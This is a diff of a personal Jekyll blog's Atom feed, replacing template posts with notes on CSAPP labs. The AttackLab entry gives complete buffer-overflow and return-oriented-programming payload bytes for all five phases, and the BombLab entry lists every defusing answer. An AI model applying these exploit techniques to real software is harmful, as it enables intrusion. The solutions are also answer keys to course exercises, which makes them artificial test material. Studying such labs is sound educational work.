@@ -1,25 +1,237 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-02T11:12:10-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pai Peng</title><subtitle>A website for my portfolio.</subtitle><author><name>Pai Peng</name></author><entry><title type="html">Future Blog Post</title><link href="http://localhost:4000/posts/2012/08/blog-post-4/" rel="alternate" type="text/html" title="Future Blog Post" /><published>2199-01-01T00:00:00-08:00</published><updated>2199-01-01T00:00:00-08:00</updated><id>http://localhost:4000/posts/2012/08/future-post</id><content type="html" xml:base="http://localhost:4000/posts/2012/08/blog-post-4/">&lt;p&gt;This post will show up by default. To disable scheduling of future posts, edit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.yml&lt;/code&gt; and set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;future: false&lt;/code&gt;.&lt;/p&gt;</content><author><name>Pai Peng</name></author><category term="cool posts" /><category term="category1" /><category term="category2" /><summary type="html">This post will show up by default. To disable scheduling of future posts, edit config.yml and set future: false.</summary></entry><entry><title type="html">Blog Post number 4</title><link href="http://localhost:4000/posts/2012/08/blog-post-4/" rel="alternate" type="text/html" title="Blog Post number 4" /><published>2015-08-14T00:00:00-07:00</published><updated>2015-08-14T00:00:00-07:00</updated><id>http://localhost:4000/posts/2012/08/blog-post-4</id><content type="html" xml:base="http://localhost:4000/posts/2012/08/blog-post-4/">&lt;p&gt;This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-02T11:47:40-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pai Peng</title><subtitle>A website for my portfolio.</subtitle><author><name>Pai Peng</name></author><entry><title type="html">CSAPP Lab6 ShellLab</title><link href="http://localhost:4000/posts/2023/05/csapp-lab6/" rel="alternate" type="text/html" title="CSAPP Lab6 ShellLab" /><published>2023-05-24T00:00:00-07:00</published><updated>2023-05-24T00:00:00-07:00</updated><id>http://localhost:4000/posts/2023/05/CSAPP-Lab6</id><content type="html" xml:base="http://localhost:4000/posts/2023/05/csapp-lab6/">&lt;ol&gt;
+  &lt;li&gt;Reading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8.1 - 8.8&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CSAPP: 3e&lt;/code&gt; and the writeup can be very helpful;&lt;/li&gt;
+  &lt;li&gt;Make sure you understand the content in the slides very carefully, especially 15-ecf-signals.pdf;&lt;/li&gt;
+  &lt;li&gt;Read the writeup very carefully.&lt;/li&gt;
+&lt;/ol&gt;
 
-&lt;h1 id=&quot;headings-are-cool&quot;&gt;Headings are cool&lt;/h1&gt;
+&lt;h2 id=&quot;working-on-the-lab&quot;&gt;Working on the lab&lt;/h2&gt;
 
-&lt;h1 id=&quot;you-can-have-many-headings&quot;&gt;You can have many headings&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Some snippets in lecture slides and book are very similar to the code for the lab, you can just copy it and change some details;&lt;/li&gt;
+  &lt;li&gt;The writeup provides strategies for most of the tricky parts in the lab, it can guide you through the lab, so make sure you read the writeup very carefully;&lt;/li&gt;
+  &lt;li&gt;Make good use of man page.&lt;/li&gt;
+&lt;/ol&gt;
 
-&lt;h2 id=&quot;arent-headings-cool&quot;&gt;Aren’t headings cool?&lt;/h2&gt;</content><author><name>Pai Peng</name></author><category term="cool posts" /><category term="category1" /><category term="category2" /><summary type="html">This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.</summary></entry><entry><title type="html">Blog Post number 3</title><link href="http://localhost:4000/posts/2014/08/blog-post-3/" rel="alternate" type="text/html" title="Blog Post number 3" /><published>2014-08-14T00:00:00-07:00</published><updated>2014-08-14T00:00:00-07:00</updated><id>http://localhost:4000/posts/2014/08/blog-post-3</id><content type="html" xml:base="http://localhost:4000/posts/2014/08/blog-post-3/">&lt;p&gt;This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.&lt;/p&gt;
+&lt;h2 id=&quot;some-questions&quot;&gt;Some questions&lt;/h2&gt;
 
-&lt;h1 id=&quot;headings-are-cool&quot;&gt;Headings are cool&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Why the child process cannot use printf()?&lt;/li&gt;
+&lt;/ol&gt;
 
-&lt;h1 id=&quot;you-can-have-many-headings&quot;&gt;You can have many headings&lt;/h1&gt;
+&lt;p&gt;I tried to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; to track the child process and find out what happened inside, but there was no output for the child process on the console.&lt;/p&gt;
 
-&lt;h2 id=&quot;arent-headings-cool&quot;&gt;Aren’t headings cool?&lt;/h2&gt;</content><author><name>Pai Peng</name></author><category term="cool posts" /><category term="category1" /><category term="category2" /><summary type="html">This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.</summary></entry><entry><title type="html">Blog Post number 2</title><link href="http://localhost:4000/posts/2013/08/blog-post-2/" rel="alternate" type="text/html" title="Blog Post number 2" /><published>2013-08-14T00:00:00-07:00</published><updated>2013-08-14T00:00:00-07:00</updated><id>http://localhost:4000/posts/2013/08/blog-post-2</id><content type="html" xml:base="http://localhost:4000/posts/2013/08/blog-post-2/">&lt;p&gt;This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.&lt;/p&gt;
+&lt;p&gt;The reason is here:&lt;/p&gt;
 
-&lt;h1 id=&quot;headings-are-cool&quot;&gt;Headings are cool&lt;/h1&gt;
+&lt;p&gt;When a child process is created, it inherits a copy of the parent process’s file descriptors, including the standard output file descriptor (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt;). However, the output buffering state is also inherited. By default, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; is line-buffered, meaning the output is stored in a buffer until a newline character (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'\n'&lt;/code&gt;) is encountered or the buffer is full.&lt;/p&gt;
 
-&lt;h1 id=&quot;you-can-have-many-headings&quot;&gt;You can have many headings&lt;/h1&gt;
+&lt;p&gt;In the case of a child process, if the output buffer is not flushed before the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fork()&lt;/code&gt; call or if the child process doesn’t explicitly flush the buffer, the buffered output will also be duplicated in the child process. This means that the child process will have its own copy of the buffered output, separate from the parent process.&lt;/p&gt;
 
-&lt;h2 id=&quot;arent-headings-cool&quot;&gt;Aren’t headings cool?&lt;/h2&gt;</content><author><name>Pai Peng</name></author><category term="cool posts" /><category term="category1" /><category term="category2" /><summary type="html">This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.</summary></entry><entry><title type="html">Blog Post number 1</title><link href="http://localhost:4000/posts/2012/08/blog-post-1/" rel="alternate" type="text/html" title="Blog Post number 1" /><published>2012-08-14T00:00:00-07:00</published><updated>2012-08-14T00:00:00-07:00</updated><id>http://localhost:4000/posts/2012/08/blog-post-1</id><content type="html" xml:base="http://localhost:4000/posts/2012/08/blog-post-1/">&lt;p&gt;This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.&lt;/p&gt;
+&lt;p&gt;If the child process attempts to print using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt;, the output will go to its own copy of the output buffer. However, because the buffer is not automatically flushed, the output may not immediately appear on the console or in the output stream.&lt;/p&gt;
 
-&lt;h1 id=&quot;headings-are-cool&quot;&gt;Headings are cool&lt;/h1&gt;
+&lt;p&gt;To address this, you can explicitly flush the output buffer before the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fork()&lt;/code&gt; call or use functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fflush(stdout)&lt;/code&gt; to manually flush the buffer in both the parent and child processes. This ensures that the buffered output is immediately visible.&lt;/p&gt;
 
-&lt;h1 id=&quot;you-can-have-many-headings&quot;&gt;You can have many headings&lt;/h1&gt;
+&lt;p&gt;Additionally, you can use functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write()&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; for immediate output, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write()&lt;/code&gt; writes directly to the file descriptor without buffering.&lt;/p&gt;
 
-&lt;h2 id=&quot;arent-headings-cool&quot;&gt;Aren’t headings cool?&lt;/h2&gt;</content><author><name>Pai Peng</name></author><category term="cool posts" /><category term="category1" /><category term="category2" /><summary type="html">This is a sample blog post. Lorem ipsum I can’t remember the rest of lorem ipsum and don’t have an internet connection right now. Testing testing testing this blog post. Blog posts are cool.</summary></entry></feed>
+&lt;ol&gt;
+  &lt;li&gt;How to check the process is no longer the foreground process in this lab?&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;waitfg()&lt;/code&gt;, we use a busy loop around the sleep function (0.1s) to check the existence of the current foreground process (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check whether the current job id is in the job list&lt;/code&gt;). If the fg process is terminated, the related job will be deleted from the job list and the shell program will end the busy sleep loop and immediately return.&lt;/p&gt;
+
+&lt;p&gt;To be more specific, when the child process is terminated, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;waitpid()&lt;/code&gt; will be automatically called and the parent process will reap the child process and delete its job id in the job list, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deletejob()&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sigchld_hanlder()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;For trace05, in my implementation, other processes will wait for my running background process, but it’s not for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tshref&lt;/code&gt; (run other jobs immediately without waiting). Why is there a difference?&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;By default (when options = 0), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;waitpid()&lt;/code&gt; suspends execution of the calling process until a child process in its wait set terminates.&lt;/p&gt;
+
+&lt;p&gt;If we want to return it immediately, we need to set options as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WNOHANG | WUNTRACED&lt;/code&gt; (you can check these options meaning in the book).&lt;/p&gt;</content><author><name>Pai Peng</name></author><category term="self-learning" /><category term="csapp" /><summary type="html">Reading 8.1 - 8.8 of CSAPP: 3e and the writeup can be very helpful; Make sure you understand the content in the slides very carefully, especially 15-ecf-signals.pdf; Read the writeup very carefully.</summary></entry><entry><title type="html">CSAPP Lab3 AttackLab</title><link href="http://localhost:4000/posts/2023/02/csapp-lab3/" rel="alternate" type="text/html" title="CSAPP Lab3 AttackLab" /><published>2023-02-06T00:00:00-08:00</published><updated>2023-02-06T00:00:00-08:00</updated><id>http://localhost:4000/posts/2023/02/CSAPP-Lab3</id><content type="html" xml:base="http://localhost:4000/posts/2023/02/csapp-lab3/">&lt;p&gt;Compared with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DataLab&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BombLab&lt;/code&gt;, this is a much easier lab: as it is only based on one lecture and the code you need to go through is relatively short. The only thing that can be confusing is byte ordering: when you need to reverse the bytes and when you should not.&lt;/p&gt;
+
+&lt;h2 id=&quot;phase-1&quot;&gt;Phase 1&lt;/h2&gt;
+
+&lt;p&gt;No new execution code is needed to be injected. Overflow the buffer to change the return address to the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch1()&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;phase-2&quot;&gt;Phase 2&lt;/h2&gt;
+
+&lt;p&gt;Inject my cookie to %rdi, which will be the input value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch2()&lt;/code&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;redirect the execution to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%rdi build&lt;/code&gt; function&lt;/li&gt;
+  &lt;li&gt;%rdi build function: move my cookie to %rdi&lt;/li&gt;
+  &lt;li&gt;redirect the execution to the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch2()&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Byte code for %rdi build function:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;48 c7 c7 fa 97 b9 59 c3 /* movq $0x59b997fa, %rdi */
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Put it together:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;48 c7 c7 fa 97 b9 59 c3 /* %rdi build code: move my cookie to %rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 /* address of my %rdi build code */
+ec 17 40 00 00 00 00 00 /* address of touch 2 code */
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-3&quot;&gt;Phase 3&lt;/h2&gt;
+
+&lt;p&gt;Phase 3 is similar to Phase 2, but we need to move the pointer of cookie string to register %rdi this time.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;redirect the execution to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%rdi build&lt;/code&gt; function&lt;/li&gt;
+  &lt;li&gt;%rdi build function: move the pointer of my cookie to %rdi
+    &lt;ul&gt;
+      &lt;li&gt;convert cookie string to hex format&lt;/li&gt;
+      &lt;li&gt;put the cookie string before the return address, and calculate the offset to generate the actual address&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;redirect the execution to the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch3()&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;48 c7 c7 b0 dc 61 55 c3 /* move the cookie string address to %rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 /* address of my %rdi build code */
+fa 18 40 00 00 00 00 00 /* address of touch 3 code */
+35 39 62 39 39 37 66 61 /* cookie string in hex format */
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-4&quot;&gt;Phase 4&lt;/h2&gt;
+
+&lt;p&gt;Phase 4 is also similar to Phase 2, but we cannot inject &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%rdi build function&lt;/code&gt; this time. This is because:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;It &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marks the section of memory holding the stack as nonexecutable&lt;/code&gt;, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So, we need to collect some gadgets to move my cookie to %rdi&lt;/p&gt;
+
+&lt;p&gt;Luckily, we find these assembly codes, and combine them to generate %rdi build function&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;popq %rax  
+nop  
+retq
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;movq %rax,%rdi
+nop
+retq
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;pop the cookie string to %rax&lt;/li&gt;
+  &lt;li&gt;move %rax to %rdi&lt;/li&gt;
+  &lt;li&gt;redirect the execution to the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch2()&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 /* address of popq %rax  nop  retq */
+fa 97 b9 59 00 00 00 00 /* cookie */
+a2 19 40 00 00 00 00 00 /* address of movq %rax,%rdi */
+ec 17 40 00 00 00 00 00 /* address of touch2 */
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-5&quot;&gt;Phase 5&lt;/h2&gt;
+
+&lt;p&gt;Phase 5 is similar to Phase 3, but we cannot calculate the address of cookie string based on the buffer address. This is because:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The address is unpredictable, so we cannot use the method in Phase 4 to pop the address of my cookie string.&lt;/p&gt;
+
+&lt;p&gt;So, we still need to combine some gadgets in the farm function to generate %rdi. This phase is much harder than before. You need to be very familiar with the assembly and byte code to generate a valid function.&lt;/p&gt;
+
+&lt;p&gt;I search on Google to find some useful tips to handle this phase. I choose one of them to generate my final answer.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 /* movq %rsp,%rax  48 89 e0 c3 */
+d8 19 40 00 00 00 00 00 /* add $0x37,%al   04 37 c3 */
+a2 19 40 00 00 00 00 00 /* movq %rax,%rdi  48 89 c7 c3 */
+fa 18 40 00 00 00 00 00 /* address of touch 3 */
+dd dd dd dd dd dd dd dd
+dd dd dd dd dd dd dd dd
+dd dd dd dd dd dd dd dd
+dd dd dd dd dd dd dd    /* Padding (0x37(55)-24=31 in total) */
+35 39 62 39 39 37 66 61 /* Cookie in ASCII */
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Pai Peng</name></author><category term="self-learning" /><category term="csapp" /><summary type="html">Compared with DataLab and BombLab, this is a much easier lab: as it is only based on one lecture and the code you need to go through is relatively short. The only thing that can be confusing is byte ordering: when you need to reverse the bytes and when you should not.</summary></entry><entry><title type="html">CSAPP Lab2 BombLab</title><link href="http://localhost:4000/posts/2022/10/csapp-lab2/" rel="alternate" type="text/html" title="CSAPP Lab2 BombLab" /><published>2022-10-15T00:00:00-07:00</published><updated>2022-10-15T00:00:00-07:00</updated><id>http://localhost:4000/posts/2022/10/CSAPP-Lab2</id><content type="html" xml:base="http://localhost:4000/posts/2022/10/csapp-lab2/">&lt;p&gt;In this lab, we need to understand how the assembly code works. Somtimes, we need to have a overview of all the assembly codes without paying more attention to details. We should try to understand the logic of each command in detail, not command details. Since there are so many registers involved and as they are not given meaningful name, you will quickly get overwhelmed.&lt;/p&gt;
+
+&lt;h2 id=&quot;phase-1&quot;&gt;Phase 1&lt;/h2&gt;
+
+&lt;p&gt;Input a string, and compare it with the string at 0x402400. Bomb defused if two strings are equal.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Border relations with Canada have never been better.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-2&quot;&gt;Phase 2&lt;/h2&gt;
+
+&lt;p&gt;Input 6 numbers from stdin and compares with 1, 2, 4, 8, 16, 32.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1 2 4 8 16 32
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-3&quot;&gt;Phase 3&lt;/h2&gt;
+
+&lt;p&gt;Input 2 integers. Understand the jump instruction to find the result&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;6 682
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-4&quot;&gt;Phase 4&lt;/h2&gt;
+
+&lt;p&gt;Input 2 integers. The first integer has to be below or equal 0xe, and the second integer should be 0. Phase 4 calls subroutine func4, whose return value should be 0, requiring first integer to be 7.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;7 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-5&quot;&gt;Phase 5&lt;/h2&gt;
+
+&lt;p&gt;Try many times to find a character map&lt;/p&gt;
+
+&lt;p&gt;“abcdef”-&amp;gt;”aduier”, “ghijkl”-&amp;gt;”snfotv”, “mnopqr”-&amp;gt;”bylmad”, “stuvwx”-&amp;gt;”uiersn”, “yzabcd”-&amp;gt;”foadui”&lt;/p&gt;
+
+&lt;p&gt;Input 6 characters, and the output should be “flyers” (0x6038c0)&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ionefg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;phase-6&quot;&gt;Phase 6&lt;/h2&gt;
+
+&lt;p&gt;Input 6 distinct numbers between 1-6. Form a singly-linked list that is sorted, based on the order of input.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;6 5 4 3 2 1
+
+(gdb) print *(int *) 0x6032d0
+$34 = 332
+(gdb) print *(int *) *(0x6032d0+0x8)
+$35 = 168
+(gdb) print *(int *) *(*(0x6032d0+0x8)+0x8)
+$36 = 924
+(gdb) print *(int *) *(*(*(0x6032d0+0x8)+0x8)+0x8)
+$37 = 691
+(gdb) print *(int *) *(*(*(*(0x6032d0+0x8)+0x8)+0x8)+0x8)
+$38 = 477
+(gdb) print *(int *) *(*(*(*(*(0x6032d0+0x8)+0x8)+0x8)+0x8)+0x8)
+$39 = 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;3 4 5 6 1 2 -&amp;gt; 4 3 2 1 6 5&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4 3 2 1 6 5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Pai Peng</name></author><category term="self-learning" /><category term="csapp" /><summary type="html">In this lab, we need to understand how the assembly code works. Somtimes, we need to have a overview of all the assembly codes without paying more attention to details. We should try to understand the logic of each command in detail, not command details. Since there are so many registers involved and as they are not given meaningful name, you will quickly get overwhelmed.</summary></entry><entry><title type="html">Begin The Journey</title><link href="http://localhost:4000/posts/2022/10/begin/" rel="alternate" type="text/html" title="Begin The Journey" /><published>2022-10-01T00:00:00-07:00</published><updated>2022-10-01T00:00:00-07:00</updated><id>http://localhost:4000/posts/2022/10/Begin</id><content type="html" xml:base="http://localhost:4000/posts/2022/10/begin/">&lt;p&gt;Welcome to my blog, where I document my self-learning projects and share insights on new technologies. Join me on this exciting journey of continuous growth and discovery.&lt;/p&gt;</content><author><name>Pai Peng</name></author><category term="journey" /><summary type="html">Welcome to my blog, where I document my self-learning projects and share insights on new technologies. Join me on this exciting journey of continuous growth and discovery.</summary></entry></feed>
